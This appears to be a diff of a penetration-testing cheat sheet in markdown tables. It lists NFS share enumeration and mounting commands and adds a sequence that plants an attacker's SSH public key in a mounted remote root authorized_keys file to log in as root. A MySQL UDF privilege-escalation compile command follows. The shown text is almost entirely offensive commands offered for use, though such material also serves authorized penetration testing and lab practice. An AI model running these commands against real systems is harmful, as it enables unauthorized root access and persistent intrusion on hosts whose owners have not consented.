@@ -36,10 +36,12 @@
 | showmount -e 192.168.100.25 #Check if any share is available |
 | mount -t nfs 192.168.100.25:/home /tmp/NFS |
 | mount -t nfs 192.168.1.112:/ /mnt -o nolock |
-| mkdir /tmp/NFS |
-| mkdir /tmp/NFS |
-| mkdir /tmp/NFS |
-
+| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
+| ssh-keygen -t rsa -b 4096 |
+| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
+| cat authorized_keys |
+| cat id_rsa.pub >> authorized_keys |
+|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|
 | MySQL UDF Privilge Escalation  |
 | ------------- |
 |gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
